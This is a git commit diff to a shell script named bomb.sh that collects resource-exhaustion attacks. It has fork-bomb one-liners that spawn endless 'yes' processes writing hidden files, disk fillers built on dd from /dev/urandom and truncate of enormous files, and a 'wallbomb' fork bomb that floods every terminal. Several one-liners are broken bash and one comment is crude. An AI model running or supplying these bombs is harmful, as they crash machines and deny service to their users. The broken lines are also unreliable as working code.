8ab55f8e26473ecb7c0832a5ea379e7b8ed1dbde
bigshebang <ljm3103@rit.edu>
2013-10-23 15:50:54 -0400

    adding more bombs and comment header

--- bomb.sh
+++ bomb.sh
@@ -1,19 +1,11 @@
 #!/usr/bin/env bash
-#short version but not ready yet. ignore :(){i=0;yes balls > $temp$i &;($i++);:|:&};:
-
-#yesbomb 1
-# :()
-# {
-# yes balls > file$i.txt &
-# ($1)
-# : $1| : ($1 * -1) &
-# }
-# i=0
-# : $i
+#bombs are mainly for cpu depletion but also attempt to deplete hard drive space. if CPU is maxed out this doesn't happen very quickly
+#hdd-fillers are just meant to fill the hard drive quickly. CPU may be used up, but usually not fully.
+#wallbomb takes up CPU and is super annoying
 
 #yesbomb two
 #oneliner
-
+:{for(( i=0;;i+=1));do;yes balls>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
 #full
 :
 {
@@ -33,7 +25,7 @@ done
 
 #yesbomb three
 #oneliner
-
+:{for((i=0;;i+=1));do;man bash|yes>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
 #full
 :
 {
@@ -51,7 +43,7 @@ while true; do
 	counter+=1
 done
 
-#bomb four (truncate)
+#bomb four (truncate) - needs testing
 #oneliner
 
 #full
@@ -70,7 +62,7 @@ while true; do
 	counter+=1
 done
 
-#bomb five (dd)
+#bomb five (dd) - tested and rapes system
 #oneliner
 
 #full
@@ -89,7 +81,8 @@ while true; do
 	counter+=1
 done
 
-#bombsix truncate and morph
+#bombsix truncate and morph - needs testing
+#bomb and hdd-filler
 #oneliner
 
 #full
@@ -103,7 +96,16 @@ c=0
 while true; do
 	truncate -s 30G .$c
 	: .$c & disown
+	if [ c eq 5 ]; then
+		break
+	fi
 done
+
+#hdd-filler 2
+dd if=/dev/urandom of=./.file & disown
+
+#hdd-filler 3
+truncate -s 1000000G .file & disown
 
 #wallbomb
 :(){echo "balls"|wall;:|:&disown};:&disown
